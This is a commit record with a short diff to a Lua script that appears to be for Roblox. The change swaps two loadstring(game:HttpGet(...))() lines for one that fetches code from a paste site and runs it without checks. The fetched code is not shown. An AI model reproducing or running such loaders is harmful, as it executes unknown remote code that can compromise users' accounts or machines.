bd3eeb4288c4a7131388be199147648e0623cf46
Mark <jaimepersonal46@gmail.com>
2025-12-20 16:50:06 +0100

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,8 +1,6 @@
 -- Please Any Issues Report To Me With SS of the error --
 
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216049"))()
-task.wait(5)
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216701"))()
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216702"))()
 
 
 
